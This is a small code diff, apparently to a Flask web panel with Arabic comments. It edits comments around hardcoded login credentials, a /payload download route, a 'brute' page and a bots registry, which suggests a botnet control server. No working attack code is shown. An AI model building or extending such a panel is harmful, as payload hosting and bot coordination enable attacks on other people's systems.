@@ -10,10 +10,7 @@ import base64
 app = Flask(__name__)
 app.secret_key = os.urandom(32)
 
-# ===== بيانات الدخول الجديدة (مخفية) =====
-# Email: 5768778987787878.com@875865.pin
-# Key: 5arbato
-# PIN: 7729893
+# ===== بيانات الدخول الجديدة =====
 VALID_EMAIL = "5768778987787878.com@875865.pin"
 VALID_KEY = "5arbato"
 VALID_PIN = "7729893"
@@ -90,7 +87,7 @@ def logout():
     session.clear()
     return redirect(url_for('login'))
 
-# ===== الصفحات المحمية =====
+# ===== الصفحات المحمية (Dark Mode) =====
 @app.route('/dashboard')
 @login_required
 def index():
@@ -116,7 +113,7 @@ def brute():
 def logs():
     return render_template('logs.html')
 
-# ===== مسار التحميل العام =====
+# ===== مسار التحميل =====
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 
 @app.route('/payload')
@@ -133,7 +130,7 @@ def download_payload():
         return f"Error: {e}", 500
 
 # ============================================================
-# ===== باقي APIs (نفسها) =====
+# ===== APIs =====
 # ============================================================
 
 bots = {}
